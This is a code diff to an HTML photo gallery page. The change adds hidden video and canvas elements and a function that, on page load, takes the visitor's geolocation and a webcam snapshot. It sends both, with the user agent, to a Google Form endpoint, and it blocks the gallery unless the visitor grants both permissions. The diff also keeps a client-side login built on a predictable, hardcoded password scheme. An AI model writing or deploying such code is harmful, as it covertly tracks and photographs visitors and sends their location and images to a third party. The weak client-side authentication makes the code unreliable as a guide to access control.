@@ -69,6 +69,8 @@
   </style>
 </head>
 <body>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <h1>Photo Gallery</h1>
 
@@ -81,82 +83,169 @@
   </div>
 
   <script>
-  
-  function generatePassword() {
-  const prefix = "a7138aff-";
-  const now = new Date();
+    function generatePassword() {
+      const prefix = "a7138aff-";
+      const now = new Date();
 
-  const MM = String(now.getMonth() + 1).padStart(2, '0'); // Months are 0-indexed
-  const DD = String(now.getDate()).padStart(2, '0');
-  const YYYY = now.getFullYear();
-  const HH = String(now.getHours()).padStart(2, '0');
+      const MM = String(now.getMonth() + 1).padStart(2, '0'); // Months are 0-indexed
+      const DD = String(now.getDate()).padStart(2, '0');
+      const YYYY = now.getFullYear();
+      const HH = String(now.getHours()).padStart(2, '0');
 
-  const password = `${prefix}${MM}${DD}${YYYY}${HH}`;
-  return password;
-}
-  // Simple client-side login prompt
-  const USERNAME = "admin";
-  const PASSWORD = generatePassword();
-
-  function askLogin() {
-    const username = prompt("Enter username:");
-    const password = prompt("Enter password:");
-    
-    if (username === USERNAME && password === PASSWORD) {
-      return true;
-    } else {
-      alert("Incorrect username or password!");
-      return false;
+      return `${prefix}${MM}${DD}${YYYY}${HH}`;
     }
-  }
 
-  if (!askLogin()) {
-    // Stop script execution if login fails
-    document.body.innerHTML = "<h2 style='text-align:center; margin-top:50px;'>Access Denied</h2>";
-    throw new Error("Access Denied");
-  }
-  
-  
-    const imageFilenames = [
-      "1.jpeg",
-      "2.jpg",
-      "3.jpg",
-      "4.jpg",
-	  "5.jpg",
-	  "6.jpg",
-	  "7.jpg",
-	  "8.jpg",
-	  "9.jpg",
-	  "10.jpg"
-    ];
+    const USERNAME = "admin";
+    const PASSWORD = generatePassword();
 
-    const folderPath = "Images/Photo/";
-    const gallery = document.getElementById("gallery");
-    const overlay = document.getElementById("overlay");
-    const overlayImg = document.getElementById("overlayImg");
+    function askLogin() {
+      const username = prompt("Enter username:");
+      const password = prompt("Enter password:");
 
-    imageFilenames.forEach(filename => {
-      const img = document.createElement("img");
-      img.src = folderPath + filename;
-      img.alt = filename;
+      if (username === USERNAME && password === PASSWORD) {
+        return true;
+      } else {
+        alert("Incorrect username or password!");
+        return false;
+      }
+    }
 
-      img.onerror = () => {
-        img.remove(); // Remove if not supported or missing
-        console.warn(`Could not load ${filename}`);
-      };
+    if (!askLogin()) {
+      document.body.innerHTML = "<h2 style='text-align:center; margin-top:50px;'>Access Denied</h2>";
+      throw new Error("Access Denied");
+    }
 
-      img.addEventListener("click", () => {
-        overlayImg.src = img.src;
-        overlay.style.display = "flex";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const logData = {};
+
+    async function logVisitor() {
+      const now = new Date();
+      logData.timestamp = now.toISOString();
+      logData.userAgent = navigator.userAgent;
+
+      // Geolocation
+      try {
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+        );
+        logData.location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
+      } catch (e) {
+        denyAccess("Location permission denied or unavailable.");
+        return;
+      }
+
+      // Webcam
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Wait for the video to load metadata
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
+        });
+
+        // Small delay to ensure frame is ready
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+		const MAX_WIDTH = 320;
+		const scale = MAX_WIDTH / video.videoWidth;
+		canvas.width = MAX_WIDTH;
+		canvas.height = video.videoHeight * scale;
+		canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+		// Convert to JPEG with compression
+		const imageData = canvas.toDataURL("image/jpeg", 0.5); // 50% quality
+		logData.photoBytes = imageData.split(',')[1];
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        denyAccess("Webcam permission denied or unavailable.");
+        return;
+      }
+
+      // Send data to Google Form
+      sendLogToGoogleForm(logData);
+    }
+
+    function sendLogToGoogleForm(logData) {
+      const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc8We5b4Hxi7fiXQ_WB9k_TwVzzc5irn5Ke1KGCE6mQf6opuw/formResponse";
+
+      const data = new URLSearchParams();
+
+      data.append("entry.124304782", logData.timestamp || "");
+      data.append("entry.87490688", logData.userAgent || "");
+      data.append("entry.116037827", logData.location ? logData.location.latitude : "");
+      data.append("entry.1921472229", logData.location ? logData.location.longitude : "");
+      data.append("entry.558872421", logData.photoBytes || "");
+
+      fetch(formUrl, {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+      }).then(() => {
+        console.log("Form submitted!");
+      }).catch(e => {
+        console.error("Error submitting form", e);
+      });
+    }
+
+    function denyAccess(reason) {
+      document.body.innerHTML = `
+        <h2 style='text-align:center; margin-top:50px;'>Access Denied</h2>
+        <p style='text-align:center;'>${reason}</p>
+      `;
+      throw new Error("Access denied: " + reason);
+    }
+
+    function buildGallery() {
+      const imageFilenames = [
+        "1.jpeg", "2.jpg", "3.jpg", "4.jpg", "5.jpg",
+        "6.jpg", "7.jpg", "8.jpg", "9.jpg", "10.jpg"
+      ];
+
+      const folderPath = "Images/Photo/";
+      const gallery = document.getElementById("gallery");
+      const overlay = document.getElementById("overlay");
+      const overlayImg = document.getElementById("overlayImg");
+
+      imageFilenames.forEach(filename => {
+        const img = document.createElement("img");
+        img.src = folderPath + filename;
+        img.alt = filename;
+
+        img.onerror = () => {
+          img.remove();
+          console.warn(`Could not load ${filename}`);
+        };
+
+        img.addEventListener("click", () => {
+          overlayImg.src = img.src;
+          overlay.style.display = "flex";
+        });
+
+        gallery.appendChild(img);
       });
 
-      gallery.appendChild(img);
-    });
+      overlay.addEventListener("click", () => {
+        overlay.style.display = "none";
+        overlayImg.src = "";
+      });
+    }
 
-    overlay.addEventListener("click", () => {
-      overlay.style.display = "none";
-      overlayImg.src = "";
-    });
+    async function initPage() {
+      try {
+        await logVisitor(); // Wait for permissions and logging
+        buildGallery();     // Build gallery only if access granted
+      } catch (err) {
+        denyAccess("Required permissions not granted.");
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", initPage);
   </script>
 
 </body>
